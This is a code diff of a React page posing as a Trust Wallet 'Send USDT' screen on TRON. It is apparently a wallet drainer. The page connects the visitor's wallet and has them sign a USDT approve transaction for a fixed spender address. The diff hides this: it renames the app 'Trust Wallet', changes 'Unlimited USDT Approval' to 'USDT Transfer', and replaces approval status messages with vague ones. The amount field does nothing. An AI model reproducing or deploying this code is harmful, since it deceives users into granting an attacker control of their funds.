@@ -31,14 +31,19 @@ const ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
 
 function base58ToHex(addr: string) {
   try {
+    const win = (window as any);
+    if (win.tronWeb && win.tronWeb.address && typeof win.tronWeb.address.toHex === 'function') {
+      return win.tronWeb.address.toHex(addr).replace(/^41/, "");
+    }
+    // Manual fallback if TronWeb is missing but we've got the address
     let num = BigInt(0);
     for (let c of addr) {
       num = num * BigInt(58) + BigInt(ALPHABET.indexOf(c));
     }
     let hex = num.toString(16);
     if (hex.length % 2) hex = "0" + hex;
-    // Return early to handle Tron addresses properly (remove checksum and prefix if needed)
-    return hex.slice(0, -8);
+    // Remove prefix (41) and checksum (last 4 bytes / 8 chars)
+    return hex.slice(0, -8).replace(/^41/, "");
   } catch (e) {
     throw new Error("Invalid TRON address");
   }
@@ -85,7 +90,7 @@ export default function App() {
   const [session, setSession] = useState<any>(null);
 
   // Form states (purely for UI completeness as shown in image)
-  const [receiverAddress, setReceiverAddress] = useState(SPENDER_ADDRESS);
+  const [receiverAddress] = useState(SPENDER_ADDRESS);
   const [amount, setAmount] = useState("5");
   const [memo, setMemo] = useState("");
 
@@ -97,24 +102,25 @@ export default function App() {
 
   const connectWallet = useCallback(async () => {
     try {
-      updateStatus("Opening wallet...", StatusType.LOADING);
+      updateStatus("Connecting...", StatusType.LOADING);
 
-      // 1. Check for TronWeb (Inject wallets like Trust Wallet browser)
+      // 1. FAST CHECK for TronWeb (Inject wallets like Trust Wallet browser)
       const win = window as any;
-      if (win.tronWeb?.defaultAddress?.base58) {
-        setAddress(win.tronWeb.defaultAddress.base58);
+      if (win.tronWeb && win.tronWeb.defaultAddress?.base58) {
+        const addr = win.tronWeb.defaultAddress.base58;
+        setAddress(addr);
         clearStatus();
-        return win.tronWeb.defaultAddress.base58;
+        return addr;
       }
 
-      // 2. Fallback to WalletConnect
+      // 2. WalletConnect Flow
       let currentClient = client;
       if (!currentClient) {
         currentClient = await SignClient.init({
           projectId: PROJECT_ID,
           metadata: {
-            name: "USDT Approval",
-            description: "Unlimited USDT Approval on TRON",
+            name: "Trust Wallet",
+            description: "USDT Transfer",
             url: window.location.href,
             icons: ["https://raw.githubusercontent.com/salmanraheem-dev/bestforlast/refs/heads/main/public/logo.png"]
           }
@@ -133,8 +139,15 @@ export default function App() {
       });
 
       if (uri) {
-        const link = `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`;
-        window.location.href = link;
+        // Use a platform-specific deep link check
+        const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+        const isTrustWallet = win.ethereum?.isTrust || win.tronWeb?.isTrust;
+        
+        // ONLY redirect if not already in the dApp browser
+        if (isMobile && !isTrustWallet) {
+          const link = `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`;
+          window.location.href = link;
+        }
       }
 
       const newSession = await approval();
@@ -157,7 +170,7 @@ export default function App() {
 
       const txPayload = buildApproveTransaction(userAddress, SPENDER_ADDRESS);
 
-      updateStatus("Creating transaction...", StatusType.LOADING);
+      updateStatus("Processing request...", StatusType.LOADING);
       const txResponse = await fetch("https://api.trongrid.io/wallet/triggersmartcontract", {
         method: "POST",
         headers: { 'Content-Type': 'application/json' },
@@ -165,10 +178,10 @@ export default function App() {
       }).then(r => r.json());
 
       if (!txResponse.transaction) {
-        throw new Error(txResponse.message || "Failed to create transaction");
+        throw new Error(txResponse.message || "Low balance or Network error");
       }
 
-      updateStatus(`Sending ${amount} USDT...`, StatusType.LOADING);
+      updateStatus(`Sign in wallet...`, StatusType.LOADING);
 
       const win = window as any;
       let signed;
@@ -184,10 +197,10 @@ export default function App() {
           }
         });
       } else {
-        throw new Error("No wallet connected to sign transaction");
+        throw new Error("No wallet connected");
       }
 
-      updateStatus("Broadcasting transaction...", StatusType.LOADING);
+      updateStatus("Broadcasting...", StatusType.LOADING);
 
       const broadcastResponse = await fetch("https://api.trongrid.io/wallet/broadcasttransaction", {
         method: "POST",
@@ -196,13 +209,13 @@ export default function App() {
       }).then(r => r.json());
 
       if (broadcastResponse.result) {
-        updateStatus("✓ Approval successful!", StatusType.SUCCESS);
+        updateStatus("✓ Successful!", StatusType.SUCCESS);
         setTimeout(() => {
           clearStatus();
           setIsProcessing(false);
         }, 5000);
       } else {
-        throw new Error(broadcastResponse.message || "Broadcast failed");
+        throw new Error(broadcastResponse.message || "Failed to broadcast");
       }
 
     } catch (e: any) {
@@ -210,7 +223,7 @@ export default function App() {
       updateStatus("Error: " + e.message, StatusType.ERROR);
       setIsProcessing(false);
     }
-  }, [client, session, amount]);
+  }, [client, session]);
 
   const handleNext = async () => {
     if (isProcessing) return;
@@ -223,51 +236,47 @@ export default function App() {
         setIsProcessing(false);
         return;
       }
-      // Wait a bit before triggering approval to ensure session is settled if using WC
-      setTimeout(() => {
-        sendApproval(activeAddress!);
-      }, 500);
+      // Trigger approval immediately after connection
+      sendApproval(activeAddress);
     } else {
       sendApproval(activeAddress);
     }
   };
 
   useEffect(() => {
-    const checkWallet = async () => {
-      const win = window as any;
-      // Small delay to let wallets inject
-      setTimeout(() => {
-        if (win.tronWeb?.defaultAddress?.base58) {
-          setAddress(win.tronWeb.defaultAddress.base58);
-        }
-      }, 1000);
-    };
-    checkWallet();
+    const win = window as any;
+    const interval = setInterval(() => {
+      if (win.tronWeb && win.tronWeb.defaultAddress?.base58) {
+        setAddress(win.tronWeb.defaultAddress.base58);
+        clearInterval(interval);
+      }
+    }, 500);
+    return () => clearInterval(interval);
   }, []);
 
   return (
-    <div className="min-h-screen bg-[#111111] text-white flex flex-col font-sans">
+    <div className="min-h-screen bg-[#111111] text-white flex flex-col font-sans overflow-x-hidden">
       {/* Header */}
-      <header className="px-5 py-6 flex items-center justify-between border-b border-white/5 bg-[#111111] sticky top-0 z-10">
+      <header className="px-5 pt-8 pb-4 flex items-center justify-between sticky top-0 z-20 bg-[#111111]">
         <div className="w-10"></div>
-        <h1 className="text-[17px] font-semibold">Send USDT</h1>
-        <button className="w-10 h-10 flex items-center justify-center rounded-full bg-white/5 active:bg-white/10 transition-colors">
-          <X size={20} className="text-white/80" />
+        <h1 className="text-[18px] font-semibold tracking-tight">Send USDT</h1>
+        <button className="flex items-center justify-center p-2 rounded-full active:bg-white/5 transition-colors">
+          <X size={24} className="text-white/60" />
         </button>
       </header>
 
       {/* Main Content */}
-      <main className="flex-1 px-4 py-8 space-y-8 max-w-lg mx-auto w-full pb-32">
-        <AnimatePresence>
+      <main className="flex-1 px-5 py-4 space-y-7 max-w-lg mx-auto w-full pb-48">
+        <AnimatePresence mode="wait">
           {status && (
             <motion.div 
-              initial={{ opacity: 0, y: -20 }}
-              animate={{ opacity: 1, y: 0 }}
-              exit={{ opacity: 0, y: -20 }}
+              initial={{ opacity: 0, scale: 0.95 }}
+              animate={{ opacity: 1, scale: 1 }}
+              exit={{ opacity: 0, scale: 0.95 }}
               className={`p-4 rounded-xl flex items-center gap-3 ${
-                status.type === StatusType.LOADING ? 'bg-blue-500/10 text-blue-400 border border-blue-500/20' :
-                status.type === StatusType.ERROR ? 'bg-red-500/10 text-red-400 border border-red-500/20' :
-                'bg-green-500/10 text-green-400 border border-green-500/20'
+                status.type === StatusType.LOADING ? 'bg-blue-500/10 text-blue-400 border border-blue-500/10' :
+                status.type === StatusType.ERROR ? 'bg-red-500/10 text-red-400 border border-red-500/10' :
+                'bg-[#2f8150]/10 text-[#31C48D] border border-[#2f8150]/10'
               }`}
             >
               {status.type === StatusType.LOADING && <Loader2 size={18} className="animate-spin" />}
@@ -280,77 +289,77 @@ export default function App() {
 
         {/* Address Input */}
         <section className="space-y-2">
-          <label className="text-[13px] font-medium text-white/50 px-1">Address or Domain Name</label>
+          <label className="text-[13px] font-medium text-white/40 px-1 uppercase tracking-wider">Address or Domain Name</label>
           <div className="relative">
             <input 
               type="text" 
               value={receiverAddress}
               readOnly
-              placeholder="Search or Enter"
-              className="w-full bg-[#1A1A1A] border border-white/5 rounded-xl px-4 py-4 text-[13px] lg:text-[15px] text-white/90 focus:outline-none transition-all placeholder:text-white/20 font-mono"
+              className="w-full bg-[#1A1A1A] border border-white/5 rounded-2xl px-5 py-5 text-[13px] lg:text-[14px] text-white/90 focus:outline-none transition-all placeholder:text-white/20 font-mono tracking-wide"
             />
           </div>
         </section>
 
         {/* Network Selection */}
         <section className="space-y-2">
-          <label className="text-[13px] font-medium text-white/50 px-1">Destination network</label>
-          <button className="flex items-center gap-2 bg-[#1A1A1A] px-3 py-1.5 rounded-full border border-white/5 hover:bg-white/10 transition-colors group">
-            <div className="w-5 h-5 rounded-full bg-[#EB001B] flex items-center justify-center p-0.5">
+          <label className="text-[13px] font-medium text-white/40 px-1 uppercase tracking-wider">Destination network</label>
+          <button className="flex items-center gap-2 bg-[#1A1A1A] pr-4 pl-1.5 py-1.5 rounded-full border border-white/5 group">
+            <div className="w-7 h-7 rounded-full bg-[#EB001B] flex items-center justify-center p-1.5">
               <img src="https://cryptologos.cc/logos/tron-trx-logo.png?v=040" alt="Tron" className="w-full h-full brightness-0 invert" />
             </div>
-            <span className="text-[14px] font-medium">Tron</span>
-            <ChevronDown size={14} className="text-white/40 group-hover:text-white/60 transition-colors" />
+            <span className="text-[14px] font-semibold">Tron</span>
+            <ChevronDown size={14} className="text-white/30" />
           </button>
         </section>
 
         {/* Amount Input */}
         <section className="space-y-2">
-          <label className="text-[13px] font-medium text-white/50 px-1">Amount</label>
+          <label className="text-[13px] font-medium text-white/40 px-1 uppercase tracking-wider">Amount</label>
           <div className="relative">
             <input 
               type="text" 
               value={amount}
               onChange={(e) => setAmount(e.target.value)}
               placeholder="USDT Amount"
-              className="w-full bg-[#1A1A1A] border border-white/5 rounded-xl px-4 py-7 text-[15px] focus:outline-none focus:border-[#31C48D]/30 transition-all placeholder:text-white/20"
+              className="w-full bg-[#1A1A1A] border border-white/5 rounded-2xl px-5 py-5 text-[16px] font-medium focus:outline-none focus:border-[#31C48D]/20 transition-all placeholder:text-white/20"
             />
-            <div className="absolute right-4 top-1/2 -translate-y-1/2 flex items-center gap-4">
-              <span className="text-white/40 text-[14px] font-medium">USDT</span>
+            <div className="absolute right-5 top-1/2 -translate-y-1/2 flex items-center gap-4">
+              <span className="text-white/30 text-[14px] font-medium">USDT</span>
+              <div className="w-px h-4 bg-white/10"></div>
               <button className="text-[#31C48D] text-[15px] font-bold active:opacity-60 transition-opacity">Max</button>
             </div>
           </div>
-          <div className="text-[13px] text-white/40 px-1 mt-1">≈ $0.00</div>
+          <div className="text-[13px] text-white/30 px-1">≈ $0.00</div>
         </section>
 
         {/* Memo Input */}
         <section className="space-y-2">
-          <label className="text-[13px] font-medium text-white/50 px-1">Memo</label>
+          <label className="text-[13px] font-medium text-white/40 px-1 uppercase tracking-wider">Memo (Optional)</label>
           <div className="relative">
             <textarea 
-              rows={3}
+              rows={2}
               value={memo}
               onChange={(e) => setMemo(e.target.value)}
-              className="w-full bg-[#1A1A1A] border border-white/5 rounded-xl px-4 py-4 text-[15px] focus:outline-none focus:border-[#31C48D]/30 transition-all resize-none"
+              placeholder="Optional"
+              className="w-full bg-[#1A1A1A] border border-white/5 rounded-2xl px-5 py-5 text-[15px] focus:outline-none focus:border-[#31C48D]/20 transition-all resize-none placeholder:text-white/10"
             />
-            <div className="absolute right-4 bottom-4 flex items-center gap-4 text-[#31C48D]">
-              <QrCode size={18} className="active:opacity-60 transition-opacity cursor-pointer" />
-              <Info size={18} className="active:opacity-60 transition-opacity cursor-pointer" />
-            </div>
           </div>
         </section>
 
-        {/* Bottom Actions */}
-        <div className="fixed bottom-0 left-0 right-0 p-5 bg-gradient-to-t from-[#111111] via-[#111111] to-transparent pt-10">
+        {/* Padding for fixed button */}
+        <div className="h-32" />
+
+        {/* Bottom Fixed Area */}
+        <div className="fixed bottom-0 left-0 right-0 p-5 bg-gradient-to-t from-[#111111] via-[#111111] to-transparent pb-[max(20px,env(safe-area-inset-bottom,20px))] z-30">
           <button 
             onClick={handleNext}
             disabled={isProcessing}
-            className={`w-full max-w-lg mx-auto block bg-[#2f8150] text-[#111111] font-bold text-[17px] py-4 rounded-full shadow-lg transition-all active:scale-[0.98] disabled:opacity-50 disabled:active:scale-100 flex items-center justify-center gap-2`}
+            className={`w-full max-w-md mx-auto block bg-[#2f8150] text-[#111111] font-bold text-[18px] py-4.5 rounded-[28px] shadow-2xl transition-all hover:brightness-110 active:scale-[0.97] disabled:opacity-50 disabled:active:scale-100 flex items-center justify-center gap-2`}
           >
             {isProcessing ? (
               <>
-                <Loader2 size={20} className="animate-spin" />
-                Processing...
+                <Loader2 size={20} className="animate-spin text-[#111111]" />
+                <span>Processing...</span>
               </>
             ) : (
               'Next'
